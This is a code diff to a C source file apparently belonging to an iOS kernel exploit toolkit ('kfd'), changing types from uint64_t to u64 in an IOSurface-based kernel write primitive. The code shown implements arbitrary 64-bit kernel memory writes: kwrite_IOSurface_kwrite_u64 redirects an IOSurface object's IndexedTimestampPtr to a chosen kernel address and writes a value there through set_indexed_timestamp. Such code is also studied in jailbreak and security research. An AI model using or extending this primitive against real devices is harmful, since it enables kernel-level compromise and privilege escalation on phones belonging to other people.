@@ -10,6 +10,8 @@
 
 io_connect_t g_surfaceConnect = 0;
 
+void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);
+
 void kwrite_IOSurface_init(struct kfd* kfd)
 {
     if (kfd->kread.krkw_method_ops.init != kread_IOSurface_init) {
@@ -17,14 +19,14 @@ void kwrite_IOSurface_init(struct kfd* kfd)
     }
 }
 
-void kwrite_IOSurface_allocate(struct kfd* kfd, uint64_t id)
+void kwrite_IOSurface_allocate(struct kfd* kfd, u64 id)
 {
     if (kfd->kread.krkw_method_ops.allocate != kread_IOSurface_allocate) {
         return kread_IOSurface_allocate(kfd, id);
     }
 }
 
-bool kwrite_IOSurface_search(struct kfd* kfd, uint64_t object_uaddr)
+bool kwrite_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
 {
     if (kfd->kread.krkw_method_ops.search != kread_IOSurface_search) {
         return kread_IOSurface_search(kfd, object_uaddr);
@@ -32,9 +34,9 @@ bool kwrite_IOSurface_search(struct kfd* kfd, uint64_t object_uaddr)
     return true;
 }
 
-void kwrite_IOSurface_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
+void kwrite_IOSurface_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
 {
-    kwrite_from_method(uint64_t, kwrite_IOSurface_kwrite_u64);
+    kwrite_from_method(u64, kwrite_IOSurface_kwrite_u64);
 }
 
 void kwrite_IOSurface_find_proc(struct kfd* kfd)
@@ -42,7 +44,7 @@ void kwrite_IOSurface_find_proc(struct kfd* kfd)
     return;
 }
 
-void kwrite_IOSurface_deallocate(struct kfd* kfd, uint64_t id)
+void kwrite_IOSurface_deallocate(struct kfd* kfd, u64 id)
 {
     if (kfd->kread.krkw_method_ops.deallocate != kread_IOSurface_deallocate) {
         return kread_IOSurface_deallocate(kfd, id);
@@ -60,9 +62,9 @@ void kwrite_IOSurface_free(struct kfd* kfd)
  * 64-bit kwrite function.
  */
 
-void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, uint64_t kaddr, uint64_t new_value)
+void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
 {
-    uint64_t iosurface_uaddr = 0;
+    u64 iosurface_uaddr = 0;
     struct iosurface_obj krwObject = { 0 };
     
     if (kfd->kread.krkw_method_ops.init == kread_IOSurface_init) {
@@ -76,7 +78,7 @@ void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, uint64_t kaddr, uint64_t new_v
         krwObject = objectStorage[kfd->kwrite.krkw_object_id];
     }
     
-    uint64_t backup = dynamic_uget(IOSurface, IndexedTimestampPtr, iosurface_uaddr);
+    u64 backup = dynamic_uget(IOSurface, IndexedTimestampPtr, iosurface_uaddr);
     dynamic_uset(IOSurface, IndexedTimestampPtr, iosurface_uaddr, kaddr);
     
     set_indexed_timestamp(krwObject.port, krwObject.surface_id, 0, new_value);
